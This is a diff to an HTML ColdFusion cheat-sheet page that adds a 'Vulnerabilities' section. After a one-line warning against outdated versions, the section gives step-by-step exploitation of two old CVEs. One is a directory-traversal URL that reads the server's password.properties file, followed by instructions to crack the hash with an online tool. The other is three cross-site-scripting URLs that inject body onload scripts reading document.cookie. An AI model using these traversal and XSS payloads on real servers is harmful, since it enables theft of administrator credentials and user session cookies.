@@ -101,6 +101,8 @@
                     <li><a href="#errors">Error Handling</a></li>
                     <li><a href="#debug">Debugging</a></li>
                     <li><a href="#comments">Comments</a></li>
+					<li ><a href="#vulnerability">Vulnerabilities</a></li>
+					<li ><a href="#tricks">Tips & Tricks</a></li>
                 </ul>
             </nav>
 
@@ -664,7 +666,46 @@ completed query MyDBQuery; Query Execution time:
                     
                 </div>
             </section>
+			<section class="container section" id="vulnerability">
+                <h3 class="section__title">Vulnerabilities</h3>
+                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">ColdFusion had a lot of security vulnerabilities in the past, so stop using older versions!</p>
 
+                <div class="row">
+                    
+					<div class="col-md-6 col-lg-12">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <h5 class="col-xs-12 col-sm-12"># CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability</h5>
+								<small  class="col-xs-12 col-sm-12">detailed information about the exploitation of this vulnerability: <a href="http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/">http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/</a></small>
+								<h6  class="col-xs-12 col-sm-12">1. open file in browser</h6>
+                                <pre style="">http://[server:port]/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</pre>
+                            </div>
+							<div class="row justify-content-between align-items-center">
+								<h6  class="col-xs-12 col-sm-12">2. copy the hashed password</h6>
+                                <pre style="">#Fri Feb 07 05:48:45 PST 2020 rdspassword= password=42DABCDFADADASASAS4891539FASDA11CA5 encrypted=true</pre>
+
+								<h6  class="col-xs-12 col-sm-12">3. compare with rainbow tables</h6>
+                                <pre style="">https://www.dcode.fr/sha1-hash</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+				<div class="row">
+                    
+					<div class="col-md-6 col-lg-12">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <h5 class="col-xs-12 col-sm-12"># CVE-2009-1872 - Adobe ColdFusion Server Query String Cross-Site Scripting</h5>
+								<small  class="col-xs-12 col-sm-12">detailed information about the exploitation of this vulnerability: <a href="https://www.securityfocus.com/bid/36046/info">https://www.securityfocus.com/bid/36046/info</a></small>
+								<h6  class="col-xs-12 col-sm-12">1. open file in browser</h6>
+                                <pre style="">http://www.example.com:8500/CFIDE/componentutils/componentdetail.cfm?component=&#x3c;body%20onload=alert(document.cookie)></pre>
+                                <pre style="">http://www.example.com:8500/CFIDE/componentutils/cfcexplorer.cfc?method=getcfcinhtml&name=%3Cbody%20onload=alert(document.cookie)%3E</pre>
+                                <pre style="">http://www.example.com:8500/CFIDE/componentutils/cfcexplorer.cfc?method=%3Cbody%20onload=alert(document.cookie)%3E</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
             <footer>
                 <p>Built & Maintained by <a target="_blank" href="https://www.facebook.com/stefanneropejcic">Stefan Pejcic</a></p><small>ColdFusion is a trademark of Adobe Systems Incorporated.</small>
             </footer>
